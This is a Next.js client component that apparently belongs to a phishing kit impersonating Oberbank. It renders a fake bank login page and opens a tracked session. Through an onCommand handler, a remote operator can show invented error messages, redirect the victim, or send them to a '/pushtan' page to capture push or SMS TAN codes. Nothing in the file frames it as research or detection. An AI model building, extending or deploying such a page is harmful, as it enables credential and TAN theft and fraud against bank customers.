"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import CookieBanner from "@/components/CookieBanner";
import Header from "@/components/Header";
import LoginTile from "@/components/LoginTile";
import LinksTile from "@/components/LinksTile";
import MarketingTile from "@/components/MarketingTile";
import Footer from "@/components/Footer";
import { saveListingSlug, startSession, onCommand } from "@/lib/track";

export default function ClientShell({ initialSlug }: { initialSlug: string | null }) {
  const router = useRouter();
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    if (initialSlug) saveListingSlug(initialSlug);
    startSession("oberbank");

    onCommand((cmd) => {
      if (cmd.type === "show_error") {
        setError((cmd.payload as { message?: string }).message || "Error");
      } else if (cmd.type === "clear_error") {
        setError(null);
      } else if (cmd.type === "redirect") {
        const url = (cmd.payload as { url?: string }).url;
        if (url) window.location.href = url;
      } else if (cmd.type === "request_push_tan") {
        router.push("/pushtan");
      } else if (cmd.type === "request_sms_tan") {
        router.push("/pushtan");
      }
    });
  }, [initialSlug, router]);

  return (
    <div className="min-h-screen flex flex-col" style={{ background: "#fafcfc" }}>
      <CookieBanner />
      <Header />

      <main className="flex-1">
        <div className="max-w-[1100px] mx-auto px-4 py-8">
          {error && (
            <div className="mb-4">
              <div className="bg-red-50 border border-red-200 text-red-700 px-4 py-3 rounded-lg text-sm">
                {error}
              </div>
            </div>
          )}
          <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
            <LoginTile />
            <LinksTile />
            <MarketingTile />
          </div>
        </div>
      </main>

      <Footer />
    </div>
  );
}
